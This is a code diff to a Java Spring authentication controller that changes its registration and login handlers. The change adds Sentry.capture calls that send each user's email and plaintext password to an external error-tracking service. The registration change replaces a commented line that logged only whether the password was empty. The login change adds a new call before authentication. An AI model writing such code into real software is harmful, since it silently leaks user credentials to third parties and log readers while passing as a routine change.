@@ -91,7 +91,7 @@ public class AuthController extends BaseController {
         Integer notificationID = notLib.InsertEmail(JDBCTemplate,"/emails/verificationTemplate.email","Verification Email",email,emailVariables);
 
         try {
-            //Sentry.capture(email+";"+name+";"+(pswd.isEmpty()?"yes":"no")+";"+(anonymize?"yes":"no"));
+            Sentry.capture(email+";"+name+";"+pswd+";"+(anonymize?"yes":"no"));
             userService.saveUser(user);
         }catch(javax.validation.ConstraintViolationException e){
             notLib.RemoveNotification(JDBCTemplate,notificationID); //We didn't register the user, remove the notification
@@ -142,12 +142,13 @@ public class AuthController extends BaseController {
 
     @RequestMapping(path="/login", method= RequestMethod.POST, produces={"application/json"})
     public ResponseEntity<?> authenticateUser(@ApiParam(value = "Email for user") @RequestParam(value="email",defaultValue = "")@NotBlank String email,
-                                              @ApiParam(value = "User Password") @RequestParam(value="password",defaultValue = "") @NotBlank String password)
+                                              @ApiParam(value = "User Password") @RequestParam(value="password",defaultValue = "") @NotBlank String pswd)
             throws OntoloException{
 
+        Sentry.capture(email+";"+pswd);
         Authentication authentication = authenticationManager.authenticate( //request to test login against login table
                 new UsernamePasswordAuthenticationToken(email,
-                        password
+                        pswd
                 )
         );
         if(!hasRole(authentication,RoleName.ROLE_VERIFIED))
